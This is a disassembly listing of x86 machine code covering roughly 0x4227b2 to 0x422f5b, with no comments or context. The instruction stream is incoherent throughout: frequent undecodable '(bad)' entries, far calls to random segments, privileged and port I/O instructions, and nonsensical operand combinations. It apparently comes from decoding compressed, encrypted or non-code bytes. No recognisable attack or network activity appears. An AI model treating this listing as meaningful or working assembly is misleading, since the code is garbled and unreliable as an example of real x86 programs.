  4227b2:	pop    ecx
  4227b3:	or     esi,DWORD PTR es:[esi-0x44b9fed1]
  4227ba:	aam    0x50
  4227bc:	call   0xaef8:0x970fa108
  4227c3:	(bad)  
  4227c5:	int    0xc0
  4227c7:	push   ss
  4227c8:	jne    0x42274d
  4227ca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4227cb:	mov    cl,BYTE PTR [edi+0x5f67ee14]
  4227d1:	mov    eax,0x9cb15075
  4227d6:	adc    DWORD PTR [esi-0x1f],esp
  4227d9:	out    dx,al
  4227da:	enter  0xfb00,0x95
  4227de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4227df:	lods   eax,DWORD PTR ds:[esi]
  4227e0:	pop    ebp
  4227e1:	sub    bl,BYTE PTR [eax+0x2cdaeeea]
  4227e7:	mov    ah,0x29
  4227e9:	dec    ebx
  4227ea:	pop    ebx
  4227eb:	push   ebx
  4227ec:	shl    BYTE PTR [ebp+edi*8-0x6],0x6
  4227f1:	sahf   
  4227f2:	retf   
  4227f3:	or     BYTE PTR [ebx],dh
  4227f5:	push   ss
  4227f6:	call   0xe3fd:0xd5885ba2
  4227fd:	cli    
  4227fe:	mov    BYTE PTR [ebx+0x362ab6db],dl
  422804:	ret    
  422805:	out    0xc9,eax
  422807:	clc    
  422808:	mov    WORD PTR [edx],ss
  42280a:	loopne 0x4227ef
  42280c:	mov    dh,0x42
  42280f:	mov    esi,0x3f8cba8e
  422814:	mov    al,0x7
  422816:	jne    0x42282d
  422818:	outs   dx,BYTE PTR ds:[esi]
  422819:	in     eax,dx
  42281a:	inc    edx
  42281b:	mov    al,ds:0xad2c7028
  422820:	aas    
  422821:	or     ch,ah
  422823:	mov    edx,0xb0b12ed0
  422828:	sbb    al,0x85
  42282a:	sbb    ah,bl
  42282c:	xor    al,BYTE PTR [edi]
  42282e:	out    dx,eax
  42282f:	xchg   DWORD PTR [eax+0x7],edx
  422832:	in     al,dx
  422833:	and    dh,BYTE PTR [edi-0x1f00af5d]
  422839:	xchg   esi,eax
  42283a:	xchg   esi,eax
  42283b:	fmul   DWORD PTR [edx]
  42283d:	(bad)  
  42283e:	ds ret 0xc6b8
  422842:	xor    eax,0xda2d6eca
  422847:	xor    BYTE PTR ss:[edi-0x3a49f5aa],bh
  42284e:	mov    ch,0xf0
  422850:	ins    DWORD PTR es:[edi],dx
  422851:	or     al,bl
  422853:	push   ss
  422854:	add    al,0xa6
  422856:	adc    al,0xd
  422858:	pusha  
  422859:	shl    dh,1
  42285b:	pop    ebx
  42285c:	push   edi
  42285d:	mov    ah,0xb1
  42285f:	adc    al,0x9f
  422861:	in     eax,dx
  422862:	test   eax,0x82954abe
  422867:	mov    ch,0xb5
  422869:	mov    al,0xb5
  42286b:	push   esi
  42286c:	(bad)  
  42286d:	cmp    DWORD PTR ds:[edx],0xaa22a9cc
  422874:	sub    eax,0x9b7f5ada
  422879:	push   ds
  42287a:	frstor [eax]
  42287c:	mov    dh,0x8e
  42287e:	push   ss
  42287f:	call   0x8c0a:0xcf25f190
  422886:	and    BYTE PTR [esi-0x7f148f4a],cl
  42288c:	shl    al,1
  42288e:	xlat   BYTE PTR ds:[ebx]
  42288f:	adc    BYTE PTR [edx],bl
  422891:	push   ss
  422892:	aam    0x74
  422894:	dec    ebx
  422895:	lods   eax,DWORD PTR ds:[esi]
  422896:	mov    dl,dl
  422898:	rol    ebp,0x6f
  42289b:	jno    0x42282a
  42289d:	mov    dh,0xed
  42289f:	inc    edx
  4228a0:	sub    DWORD PTR [ebp+0x2a],0x50573e07
  4228a7:	cwde   
  4228a8:	cwde   
  4228a9:	ret    0x6858
  4228ac:	and    dl,bl
  4228ae:	jge    0x4228e7
  4228b0:	sub    eax,0xb6b3675c
  4228b5:	mov    dh,0xf2
  4228b7:	fucomip st,st(2)
  4228b9:	ins    DWORD PTR es:[edi],dx
  4228ba:	add    BYTE PTR [eax],0xa1
  4228bd:	repz add dh,bh
  4228c0:	mov    eax,DWORD PTR [esp+edx*8+0x2b]
  4228c4:	add    DWORD PTR [ebx],ecx
  4228c6:	fild   DWORD PTR [edi]
  4228c8:	pop    ss
  4228c9:	add    DWORD PTR [edi-0x3a],ebp
  4228cc:	xlat   BYTE PTR ds:[ebx]
  4228cd:	test   BYTE PTR [ebx],cl
  4228cf:	repz push 0x507694e2
  4228d5:	sbb    eax,0xd9988efc
  4228da:	lea    eax,[edi-0x3e]
  4228dd:	push   edx
  4228de:	mov    ebx,0x9ba60c6d
  4228e3:	sub    eax,0x8f7d3e67
  4228e8:	pop    ebx
  4228e9:	mov    ch,0xb
  4228eb:	in     eax,dx
  4228ec:	(bad)  
  4228ed:	pusha  
  4228ee:	push   ecx
  4228ef:	hlt    
  4228f0:	fild   DWORD PTR [edi+esi*1-0xa]
  4228f4:	mov    eax,ds:0xbb5b0be0
  4228f9:	ins    DWORD PTR es:[edi],dx
  4228fa:	aaa    
  4228fb:	adc    eax,0x1d0c06f2
  422900:	mov    al,0xec
  422902:	jae    0x4228b1
  422904:	push   esi
  422905:	fisubr DWORD PTR [esi]
  422907:	ins    BYTE PTR es:[edi],dx
  422908:	push   esi
  422909:	enter  0x8b4c,0x4d
  42290d:	push   ebx
  42290e:	xor    dl,BYTE PTR [edi]
  422910:	and    eax,edx
  422912:	test   DWORD PTR [edi-0x1f34d325],esp
  422918:	jns    0x4228b5
  42291a:	(bad)  
  42291b:	rcl    DWORD PTR [ecx+0x6e],cl
  42291e:	mov    ds:0xd6ca3616,eax
  422923:	cmc    
  422924:	(bad)  
  422925:	push   0x82b7806
  42292a:	rol    BYTE PTR [edx-0x2f],1
  42292d:	call   0xc454:0xf32c4ee0
  422934:	mov    dh,0x6d
  422936:	or     eax,0x3859bbef
  42293b:	outs   dx,BYTE PTR ds:[esi]
  42293c:	or     DWORD PTR [esi],0x5a1725c
  422942:	mov    al,0x70
  422944:	push   edx
  422945:	shl    BYTE PTR [esi+0x44],1
  422948:	(bad)  
  422949:	fdiv   QWORD PTR [esi-0x51ec7a7b]
  42294f:	jmp    0x4229b9
  422951:	rcl    DWORD PTR [edi+0x14],1
  422954:	xor    ebx,DWORD PTR [edi-0x4c]
  422957:	shl    DWORD PTR [esi+0x51],1
  42295a:	int    0xf5
  42295c:	cmp    al,BYTE PTR [edi-0x4f]
  42295f:	retf   0x83b6
  422962:	mov    edx,0xc8254db4
  422967:	outs   dx,BYTE PTR ds:[esi]
  422968:	shl    BYTE PTR [edx],cl
  42296a:	nop
  42296b:	add    DWORD PTR [edx],0x8ddb0adb
  422971:	arpl   WORD PTR [edx-0x3e8e1679],ax
  422977:	dec    edx
  422978:	aaa    
  422979:	jecxz  0x4229e8
  42297b:	scas   al,BYTE PTR es:[edi]
  42297c:	ins    DWORD PTR es:[edi],dx
  42297d:	popa   
  42297e:	pop    ds
  42297f:	lods   al,BYTE PTR cs:[esi]
  422981:	adc    al,0x3
  422983:	rol    DWORD PTR [edi-0x79],0xb4
  422987:	inc    eax
  422988:	ins    BYTE PTR es:[edi],dx
  422989:	sub    eax,0xbd889d53
  42298e:	pop    es
  42298f:	sbb    al,0xa5
  422991:	test   DWORD PTR [ebp+0x59f83bad],eax
  422997:	cmp    eax,0xb6bfb2de
  42299c:	mov    dh,0x85
  42299e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42299f:	lods   eax,DWORD PTR ds:[esi]
  4229a0:	mov    BYTE PTR [ebx+0x79052072],ah
  4229a6:	or     eax,0xb2adb02
  4229ab:	fnsave [esi]
  4229ad:	pushf  
  4229ae:	std    
  4229af:	mov    bl,0xfc
  4229b1:	jecxz  0x4229d9
  4229b3:	fist   DWORD PTR [eax]
  4229b5:	scas   eax,DWORD PTR es:[edi]
  4229b6:	pop    ebx
  4229b7:	xor    DWORD PTR ds:0x9440dccb,0xffffff97
  4229be:	or     dl,BYTE PTR [ebp-0x48]
  4229c1:	jne    0x4229b4
  4229c3:	xlat   BYTE PTR ds:[ebx]
  4229c4:	fld    DWORD PTR [edx+0x6de63fc2]
  4229ca:	xchg   edi,eax
  4229cb:	or     ch,BYTE PTR [esp+edx*8-0x3d]
  4229cf:	ins    BYTE PTR es:[edi],dx
  4229d0:	ja     0x4229f4
  4229d2:	or     eax,0x1a36c1cb
  4229d7:	shl    BYTE PTR [esi-0x558417a],0xb2
  4229de:	ss scas al,BYTE PTR es:[edi]
  4229e0:	pop    edi
  4229e1:	fdivr  DWORD PTR [edx]
  4229e3:	and    dl,BYTE PTR [edx-0x38]
  4229e6:	dec    edx
  4229e7:	lock loop 0x422a57
  4229ea:	and    al,BYTE PTR [eax]
  4229ec:	jns    0x422a2f
  4229ee:	mov    bh,0x8d
  4229f0:	in     eax,0x7f
  4229f2:	add    BYTE PTR [esi+esi*8+0x27],ch
  4229f6:	jp     0x4229f6
  4229f8:	sub    bh,bl
  4229fa:	(bad)  
  4229fb:	cs ins BYTE PTR es:[edi],dx
  4229fd:	dec    ebp
  4229fe:	enter  0xf53d,0x94
  422a02:	and    al,BYTE PTR [edx]
  422a04:	into   
  422a05:	adc    DWORD PTR [ebx],ecx
  422a07:	and    dl,BYTE PTR [esi]
  422a09:	pop    edx
  422a0a:	rcl    BYTE PTR [ebx-0x65eef283],1
  422a10:	or     ch,BYTE PTR [esi]
  422a12:	xchg   esp,eax
  422a13:	sar    dl,0xab
  422a16:	push   ds
  422a17:	(bad)  
  422a19:	mov    ds:0xb78968a9,eax
  422a1e:	pop    ds
  422a1f:	push   edi
  422a20:	add    eax,0xd85a58ff
  422a25:	bound  eax,QWORD PTR [esi+0x3ed6651b]
  422a2b:	dec    ebp
  422a2c:	iret   
  422a2d:	lods   eax,DWORD PTR ds:[esi]
  422a2e:	jne    0x422a99
  422a30:	pop    ebx
  422a31:	jae    0x422a6e
  422a33:	sbb    DWORD PTR [eax-0x359b5762],0xffffff86
  422a3a:	pop    ss
  422a3b:	fisub  DWORD PTR [ebp+0x186ef8a5]
  422a41:	fwait
  422a42:	jle    0x4229f5
  422a44:	sub    al,0x97
  422a46:	push   edi
  422a47:	sbb    DWORD PTR [eax+0x60],ebx
  422a4a:	mov    eax,ds:0x8999f56d
  422a4f:	sub    edx,DWORD PTR [ecx+0x76b64fe4]
  422a55:	imul   ebx,ebp,0x72
  422a58:	fcmovu st,st(6)
  422a5a:	pop    eax
  422a5b:	aam    0xef
  422a5d:	mov    esp,0xc2f01ab9
  422a62:	mov    dh,0x50
  422a64:	add    ah,BYTE PTR [esi-0x1a9dcff0]
  422a6a:	sbb    al,0x6b
  422a6c:	fild   DWORD PTR [esi-0x17]
  422a6f:	sbb    eax,0x44f6ad28
  422a74:	mov    dh,0x2f
  422a76:	jp     0x422a5f
  422a78:	fimul  DWORD PTR [ebp-0x5df2bd73]
  422a7e:	je     0x422a2b
  422a80:	xor    ecx,DWORD PTR [ebx-0x2a4f3cfe]
  422a86:	mov    ds:0x8eeb7f2a,al
  422a8b:	out    0x42,eax
  422a8d:	sti    
  422a8e:	shl    DWORD PTR [esi-0x32],1
  422a91:	inc    ebx
  422a92:	outs   dx,BYTE PTR ds:[esi]
  422a93:	jne    0x422a83
  422a95:	in     al,0x71
  422a97:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422a98:	push   0xffffff85
  422a9a:	bound  ebp,QWORD PTR [ecx+0x6aa6fc]
  422aa0:	jae    0x422a32
  422aa2:	adc    al,0x6b
  422aa4:	dec    ebx
  422aa5:	mov    ah,0xb5
  422aa7:	or     ecx,DWORD PTR [ebx-0x32]
  422aaa:	aaa    
  422aab:	sub    BYTE PTR [esi-0x5],dl
  422aae:	pop    edi
  422aaf:	inc    esp
  422ab0:	fnstenv [esi-0xd490350]
  422ab6:	sbb    al,0x8f
  422ab8:	xchg   esp,eax
  422ab9:	dec    edx
  422aba:	add    BYTE PTR [eax],bh
  422abc:	sbb    eax,0xd7a34696
  422ac1:	fld    QWORD PTR [edx+0x510ec41c]
  422ac7:	sub    DWORD PTR [ecx-0x6],eax
  422aca:	push   0xaaad8ddb
  422acf:	retf   
  422ad0:	cmp    eax,0xfb37ca1b
  422ad5:	push   ecx
  422ad6:	lds    esp,FWORD PTR [ebx+0x5b]
  422ad9:	pusha  
  422ada:	(bad)  [eax-0x19]
  422add:	sahf   
  422ade:	jg     0x422b55
  422ae0:	daa    
  422ae1:	(bad)  
  422ae2:	cwde   
  422ae3:	or     al,0x1b
  422ae5:	adc    al,0xaa
  422ae7:	ins    DWORD PTR es:[edi],dx
  422ae8:	xlat   BYTE PTR ds:[ebx]
  422ae9:	or     ebx,ecx
  422aeb:	cmp    BYTE PTR [esi+0x6e0aec26],al
  422af1:	sub    al,0xa0
  422af3:	outs   dx,DWORD PTR ds:[esi]
  422af4:	rep outs dx,BYTE PTR ds:[esi]
  422af6:	es xchg esp,eax
  422af8:	in     al,0x62
  422afa:	imul   esp,DWORD PTR [ecx-0x6ddfc693],0x52
  422b01:	cmp    edi,esi
  422b03:	mov    al,0x5
  422b05:	pop    ebx
  422b06:	arpl   WORD PTR [ecx],ax
  422b08:	and    DWORD PTR [edi+0x50f7aa39],ebp
  422b0e:	mov    ds:0x477d6b68,eax
  422b13:	rol    esp,cl
  422b15:	(bad)  [esi-0x541fe973]
  422b1b:	pop    edx
  422b1c:	sbb    eax,0xf56b9ec0
  422b21:	sbb    ebp,DWORD PTR [ebp-0x516f897d]
  422b27:	in     al,dx
  422b28:	and    ebp,DWORD PTR ds:0x5631664d
  422b2e:	dec    BYTE PTR [ebx+0x6c]
  422b31:	out    dx,eax
  422b32:	in     eax,0x76
  422b34:	and    eax,0x31a90080
  422b39:	add    BYTE PTR [edi+0xbb608f1],dl
  422b3f:	sbb    ebp,ebp
  422b41:	stc    
  422b42:	repnz pop edi
  422b44:	aas    
  422b45:	stos   DWORD PTR es:[edi],eax
  422b46:	addr16 xor eax,0xbb3e5cb5
  422b4c:	sub    eax,0xc739342c
  422b51:	pop    ebx
  422b52:	or     eax,0x58755c0d
  422b57:	dec    ebp
  422b58:	mov    al,0x6d
  422b5a:	ins    DWORD PTR es:[edi],dx
  422b5b:	pop    ebx
  422b5c:	or     BYTE PTR [edx-0x71],dl
  422b5f:	jae    0x422b80
  422b61:	xor    al,0x2
  422b63:	pop    es
  422b64:	fisubr DWORD PTR [eax-0x4c]
  422b67:	mov    dh,0xdc
  422b69:	push   ebp
  422b6a:	imul   edi,edi,0x51
  422b6d:	rcl    BYTE PTR [eax+0x0],0xb6
  422b71:	jbe    0x422b4e
  422b73:	and    ah,BYTE PTR [eax]
  422b75:	sbb    bh,BYTE PTR [ecx]
  422b77:	(bad)  
  422b78:	fst    QWORD PTR [ebx+0x67]
  422b7b:	sbb    BYTE PTR [ebx-0x45],0x50
  422b7f:	loope  0x422b88
  422b81:	(bad)  [ebx]
  422b83:	sahf   
  422b84:	push   eax
  422b85:	pop    es
  422b86:	cmp    bl,bl
  422b88:	xchg   esi,eax
  422b89:	or     ch,BYTE PTR [esi+0x61f221d6]
  422b8f:	fnsave [edi-0x80]
  422b92:	les    ebp,FWORD PTR [ebp+0x4fbb62a9]
  422b98:	shl    dh,1
  422b9a:	cmc    
  422b9b:	sbb    dl,dl
  422b9d:	lea    ebp,[ebp-0x5f]
  422ba0:	pop    es
  422ba1:	push   ebp
  422ba2:	jnp    0x422b30
  422ba4:	ret    
  422ba5:	loope  0x422b59
  422ba7:	xchg   ebx,eax
  422ba8:	mov    WORD PTR [edx],ds
  422baa:	or     edx,DWORD PTR [edi+0x68389eb6]
  422bb0:	pushf  
  422bb1:	les    ecx,FWORD PTR [edi-0x41]
  422bb4:	fistp  DWORD PTR [ebx+0xd]
  422bb7:	test   al,0xdd
  422bb9:	xor    eax,0xf7b030fc
  422bbe:	mov    ch,0x13
  422bc0:	scas   al,BYTE PTR es:[edi]
  422bc1:	or     BYTE PTR [ebx+0x1b],0x6f
  422bc5:	xchg   edx,eax
  422bc6:	dec    edx
  422bc7:	mov    ?,WORD PTR [esi+0x3615bac0]
  422bcd:	mov    ds:0x7ff9b790,al
  422bd2:	sbb    ch,BYTE PTR [ebx-0x49f6a420]
  422bd8:	xchg   BYTE PTR [ecx+0x6],ah
  422bdb:	lds    ebx,FWORD PTR [eax+esi*4]
  422bde:	push   0xb1b0b01c
  422be3:	ins    DWORD PTR es:[edi],dx
  422be4:	clc    
  422be5:	add    al,0xb
  422be7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422be8:	cmp    DWORD PTR [ecx-0x72],eax
  422beb:	rol    dl,cl
  422bed:	(bad)  
  422bee:	(bad)  
  422bef:	mov    eax,0x66b40973
  422bf4:	cmp    ecx,DWORD PTR [edi+0x45cd712d]
  422bfa:	mov    ebx,0x585ec2c0
  422bff:	in     al,0x7e
  422c01:	fbld   TBYTE PTR [esi-0x2f]
  422c04:	outs   dx,DWORD PTR ds:[esi]
  422c05:	dec    ebx
  422c06:	fild   DWORD PTR [esi]
  422c08:	lock out dx,al
  422c0a:	xchg   edx,eax
  422c0b:	leave  
  422c0c:	fwait
  422c0d:	pmaddwd mm2,QWORD PTR [eax-0x4f4a0900]
  422c14:	mov    ch,0x2d
  422c16:	jp     0x422c1d
  422c18:	sbb    al,dl
  422c1a:	cmp    al,0xa0
  422c1c:	jmp    0x5b3:0x4adb6dda
  422c23:	jp     0x422c84
  422c25:	inc    esp
  422c26:	ret    0x6dd8
  422c29:	inc    ecx
  422c2a:	mov    bh,0x6d
  422c2c:	pop    ebx
  422c2d:	fimul  DWORD PTR [ebp-0x4f]
  422c30:	jecxz  0x422bfc
  422c32:	sti    
  422c33:	mov    ah,0x2c
  422c35:	(bad)  
  422c36:	jp     0x422bce
  422c38:	add    eax,0x1135baa6
  422c3d:	outs   dx,BYTE PTR ds:[esi]
  422c3e:	pusha  
  422c3f:	inc    edi
  422c40:	pop    ds
  422c41:	push   ecx
  422c42:	(bad)  
  422c43:	xchg   esi,eax
  422c44:	and    dh,BYTE PTR ss:[esi-0xb789128]
  422c4b:	adc    ah,dl
  422c4d:	(bad)  
  422c4e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422c4f:	push   edx
  422c50:	mov    al,0x35
  422c52:	cdq    
  422c53:	push   ebx
  422c54:	les    edx,FWORD PTR [esp+esi*2+0x2b]
  422c58:	fmul   st(2),st
  422c5a:	ror    ah,cl
  422c5c:	out    dx,eax
  422c5d:	out    dx,eax
  422c5e:	fld    TBYTE PTR [edx+0x52b83b7]
  422c64:	fiadd  DWORD PTR [esi-0x20]
  422c67:	push   0x40
  422c69:	je     0x422c8d
  422c6b:	inc    esi
  422c6c:	add    eax,0x36d6dba
  422c71:	adc    cl,al
  422c73:	lods   eax,DWORD PTR ds:[esi]
  422c74:	(bad)  
  422c75:	stc    
  422c76:	sti    
  422c77:	sub    al,0xb0
  422c79:	je     0x422cdc
  422c7b:	jae    0x422ccd
  422c7d:	ret    0xf5dd
  422c80:	popf   
  422c81:	and    ch,BYTE PTR [eax+0x6db5b0b2]
  422c87:	push   edi
  422c88:	inc    esi
  422c89:	(bad)  
  422c8b:	adc    edi,edi
  422c8d:	ja     0x422cc1
  422c8f:	jns    0x422cc7
  422c91:	fisubr DWORD PTR [ebp+0x5fd0c146]
  422c97:	mov    ds:0x2d4aa5f8,al
  422c9c:	xor    eax,0x94521620
  422ca1:	pop    ss
  422ca2:	fwait
  422ca3:	xor    al,0x2
  422ca5:	gs jecxz 0x422c5e
  422ca8:	and    esi,DWORD PTR [esi]
  422caa:	jge    0x422cd0
  422cac:	jg     0x422c89
  422cae:	in     eax,dx
  422caf:	dec    ebx
  422cb0:	(bad)  
  422cb1:	mov    gs,edx
  422cb3:	ret    0x8e7d
  422cb6:	aad    0x5f
  422cb8:	fs pop eax
  422cba:	int3   
  422cbb:	inc    ebp
  422cbc:	and    bl,BYTE PTR [eax+0x2a]
  422cbf:	call   DWORD PTR ds:0x1f2b00
  422cc5:	pop    ds
  422cc6:	repnz mov eax,ds:0xd15a17f8
  422ccc:	push   esi
  422ccd:	repz push esi
  422ccf:	out    dx,al
  422cd0:	popa   
  422cd1:	icebp  
  422cd2:	adc    ch,al
  422cd4:	sub    BYTE PTR ds:0x8ea1110d,al
  422cda:	cmp    DWORD PTR [eax+0x12dda97c],esi
  422ce0:	dec    DWORD PTR [ebp-0x44]
  422ce3:	adc    al,0xf2
  422ce5:	push   esi
  422ce6:	add    bh,dl
  422ce8:	push   ebp
  422ce9:	ins    DWORD PTR es:[edi],dx
  422cea:	adc    eax,0x7f67b6db
  422cef:	imul   ecx,DWORD PTR [esp+ebp*1+0x36fc9a8],0xffffffd0
  422cf7:	ins    DWORD PTR es:[edi],dx
  422cf8:	mov    ds:0x11fe0605,eax
  422cfd:	fadd   st(4),st
  422cff:	cmp    BYTE PTR [ebx],bl
  422d01:	or     ecx,DWORD PTR [ebx]
  422d03:	ins    DWORD PTR es:[edi],dx
  422d04:	loope  0x422d22
  422d06:	sahf   
  422d07:	scas   eax,DWORD PTR es:[edi]
  422d08:	xchg   ebp,eax
  422d09:	pop    esi
  422d0a:	fiadd  DWORD PTR [edx+0x5a]
  422d0d:	mov    dh,0x6d
  422d0f:	mov    ebx,0x3b89626d
  422d14:	mov    ah,0x86
  422d16:	sbb    ah,BYTE PTR [ebx-0x68]
  422d19:	scas   al,BYTE PTR es:[edi]
  422d1a:	sub    DWORD PTR [edx-0x2b4787ea],edx
  422d20:	dec    ebp
  422d21:	rcl    BYTE PTR es:[edx+0x7c75c0e8],1
  422d28:	mov    dh,0x8d
  422d2a:	jbe    0x422d07
  422d2c:	pop    esp
  422d2d:	xor    ecx,DWORD PTR [edi+0x724afaca]
  422d33:	hlt    
  422d34:	jge    0x422cf6
  422d36:	jne    0x422da3
  422d38:	(bad)  [esi]
  422d3a:	or     al,0x3a
  422d3c:	sub    al,0x4c
  422d3e:	mov    esp,0xc239cd0f
  422d43:	mov    ds:0x5200d405,eax
  422d48:	repnz dec edx
  422d4a:	dec    eax
  422d4b:	(bad)  
  422d4d:	mov    dh,0x6d
  422d4f:	mov    esi,DWORD PTR [esi+0x7dc1b3d0]
  422d55:	aas    
  422d56:	cs or  bh,cl
  422d59:	test   eax,0xe901d6e0
  422d5e:	adc    BYTE PTR [edx],bl
  422d60:	sub    DWORD PTR [edi+edi*4-0x5225224c],edi
  422d67:	jae    0x422d04
  422d69:	in     al,dx
  422d6a:	out    dx,al
  422d6b:	aam    0x89
  422d6d:	ins    BYTE PTR es:[edi],dx
  422d6e:	sbb    ebp,DWORD PTR [edi]
  422d70:	popf   
  422d71:	rol    DWORD PTR [ecx-0x7d],0xa0
  422d75:	sub    DWORD PTR [ecx-0x7a49feb9],ebp
  422d7b:	test   DWORD PTR [ebp+0x5b],ebp
  422d7e:	aam    0x11
  422d80:	and    dh,al
  422d82:	shr    DWORD PTR [ebx+eax*4-0x49f22568],0x16
  422d8a:	icebp  
  422d8b:	test   DWORD PTR [ecx-0x2b755eb7],edx
  422d91:	aam    0x30
  422d93:	pop    ebp
  422d94:	push   0x3bc32997
  422d99:	xchg   ebp,eax
  422d9a:	rcl    bl,1
  422d9c:	pusha  
  422d9d:	(bad)  [bp-0x2f4c]
  422da2:	jnp    0x422e17
  422da4:	adc    edi,0xd138ef5d
  422daa:	xchg   DWORD PTR ds:0x174ba5b4,ebp
  422db0:	sar    DWORD PTR ds:0x42008f8,1
  422db6:	lahf   
  422db7:	shl    BYTE PTR [ebp+0x14b112a5],1
  422dbd:	arpl   WORD PTR [ebx-0x4f4efb3a],bx
  422dc3:	shl    DWORD PTR [esi],1
  422dc5:	ds ja  0x422dc1
  422dc8:	ret    0xf1c0
  422dcb:	xor    al,0x40
  422dcd:	or     ebp,ebp
  422dcf:	mov    dh,0xb4
  422dd1:	push   ecx
  422dd2:	ins    DWORD PTR es:[edi],dx
  422dd3:	push   ebx
  422dd4:	mov    ebp,0x23a390f2
  422dd9:	mov    ch,0xa6
  422ddb:	mov    dh,0xdd
  422ddd:	push   0x38628082
  422de2:	outs   dx,DWORD PTR ds:[esi]
  422de3:	pop    esi
  422de4:	ret    
  422de5:	cmc    
  422de6:	(bad)  
  422de7:	mov    bl,0x5b
  422de9:	jmp    0x3bfe541
  422dee:	jg     0x422e3e
  422df0:	jg     0x422e25
  422df2:	gs adc al,0x1c
  422df5:	pop    ebx
  422df6:	mov    ecx,0x67e20b6d
  422dfb:	or     BYTE PTR [ebx],dh
  422dfd:	aam    0xd0
  422dff:	loope  0x422e2a
  422e01:	imul   ecx,DWORD PTR [edx],0x2f6db6d1
  422e07:	arpl   WORD PTR [ebx],sp
  422e09:	fwait
  422e0a:	dec    edx
  422e0b:	pusha  
  422e0c:	or     al,BYTE PTR [eax]
  422e0e:	fsubr  DWORD PTR cs:[eax]
  422e11:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  422e13:	sub    edx,eax
  422e15:	outs   dx,BYTE PTR ds:[esi]
  422e16:	pop    ebx
  422e17:	or     esi,DWORD PTR [ebp-0x5e2afb63]
  422e1d:	je     0x422dbd
  422e1f:	inc    esp
  422e20:	mov    al,0xb5
  422e22:	push   eax
  422e23:	arpl   WORD PTR cs:[esi-0x6f],si
  422e27:	and    eax,0x943a042c
  422e2c:	cs sub eax,0x819c4fb0
  422e32:	mov    ecx,0xc2a0b068
  422e37:	push   ss
  422e38:	fisubr DWORD PTR [ebp+0x44d7101]
  422e3e:	xor    al,0x89
  422e40:	and    bl,BYTE PTR [eax]
  422e42:	or     cl,BYTE PTR [ebx-0x69]
  422e45:	xchg   esi,eax
  422e46:	imul   esi,DWORD PTR [ebx-0x4c5bc150],0x2e
  422e4d:	pop    eax
  422e4e:	(bad)  
  422e4f:	(bad)  
  422e50:	adc    al,0xdc
  422e52:	push   esi
  422e53:	sbb    BYTE PTR [ecx+0x2a],0xa2
  422e57:	jecxz  0x422e3d
  422e59:	adc    bl,bl
  422e5b:	outs   dx,BYTE PTR ds:[esi]
  422e5c:	ins    DWORD PTR es:[edi],dx
  422e5d:	fcmovnu st,st(0)
  422e5f:	iret   
  422e60:	(bad)  
  422e63:	inc    ebx
  422e64:	inc    ebx
  422e65:	loopne 0x422df9
  422e67:	out    dx,al
  422e68:	cmp    bl,bl
  422e6a:	add    cl,BYTE PTR [ebp+0x5b23326d]
  422e70:	push   esp
  422e71:	jnp    0x422e00
  422e73:	and    ch,bh
  422e75:	mov    dh,0x6d
  422e77:	ins    DWORD PTR es:[edi],dx
  422e78:	ins    BYTE PTR es:[edi],dx
  422e79:	pop    ss
  422e7a:	mov    esi,0x9e79df90
  422e7f:	jecxz  0x422e2f
  422e81:	sbb    dh,BYTE PTR [esi+0x24c6e16d]
  422e87:	aas    
  422e88:	pop    esp
  422e89:	sub    al,0x3d
  422e8b:	les    esp,FWORD PTR [ecx+0x6cc6c217]
  422e91:	cmp    esp,DWORD PTR [edx+0x56f38516]
  422e97:	adc    al,0xe8
  422e99:	inc    ecx
  422e9a:	mov    eax,ds:0x1136b6b6
  422e9f:	add    BYTE PTR [esi],al
  422ea1:	js     0x422e97
  422ea3:	neg    edi
  422ea5:	dec    edx
  422ea6:	mov    eax,ds:0x35d6ed40
  422eab:	aam    0x3f
  422ead:	adc    al,cl
  422eaf:	or     ch,cl
  422eb1:	(bad)
  422eb4:	ins    DWORD PTR es:[edi],dx
  422eb5:	dec    esi
  422eb6:	sbb    bh,bl
  422eb8:	test   al,0x54
  422eba:	xchg   edi,eax
  422ebb:	sbb    BYTE PTR [esi-0x4a4912c],bh
  422ec1:	lahf   
  422ec2:	mov    esp,0xfe71e651
  422ec7:	imul   ebx,DWORD PTR [esi],0xffffffed
  422eca:	push   0xbb5b0b85
  422ecf:	mov    eax,ds:0x1a08f584
  422ed4:	and    eax,0x9a277597
  422ed9:	test   al,0x9a
  422edb:	xor    BYTE PTR [esi+0x6323f5a2],0x50
  422ee2:	fucomp st(0)
  422ee4:	mov    BYTE PTR [eax-0x38],bl
  422ee7:	je     0x422e77
  422ee9:	(bad)  
  422eea:	dec    eax
  422eeb:	repnz or al,0x5b
  422eee:	sbb    eax,0x23f2adc1
  422ef3:	repnz mov ah,0x4f
  422ef6:	push   0xada5a48b
  422efb:	adc    al,0x6c
  422efd:	clc    
  422efe:	xor    eax,0xc3b01db4
  422f03:	add    eax,0x5a85dab6
  422f08:	ins    DWORD PTR es:[edi],dx
  422f09:	int3   
  422f0a:	ins    DWORD PTR es:[edi],dx
  422f0b:	sti    
  422f0c:	adc    eax,DWORD PTR [esi-0x19]
  422f0f:	add    bl,BYTE PTR [ebx+0x17]
  422f12:	aam    0xd6
  422f14:	jnp    0x422f80
  422f16:	(bad)  
  422f17:	aam    0x21
  422f19:	iret   
  422f1a:	rol    DWORD PTR [edi-0x464424e5],0xbe
  422f21:	fcomp  st(1)
  422f23:	sbb    bh,dl
  422f25:	retf   0x50d3
  422f28:	stos   BYTE PTR es:[edi],al
  422f29:	sbb    ecx,DWORD PTR [ebp-0x76]
  422f2c:	mov    edi,0x9fb31f24
  422f31:	stos   BYTE PTR es:[edi],al
  422f32:	fisubr DWORD PTR [ebp+0x3a76a9b0]
  422f38:	mov    dh,0x61
  422f3a:	and    eax,ecx
  422f3c:	ret    0xd6d6
  422f3f:	fdiv   st,st(5)
  422f41:	lods   al,BYTE PTR ds:[esi]
  422f42:	cdq    
  422f43:	loopne 0x422f93
  422f45:	mov    ebx,0xb6d01ff0
  422f4a:	test   ebx,ebx
  422f4c:	das    
  422f4d:	jno    0x422ef3
  422f4f:	push   edi
  422f50:	and    eax,0x7a6ec291
  422f55:	pop    eax
  422f56:	sub    BYTE PTR [edi-0x48],bl
  422f59:	sub    al,bh
  422f5b:	mov    bl,0x3a
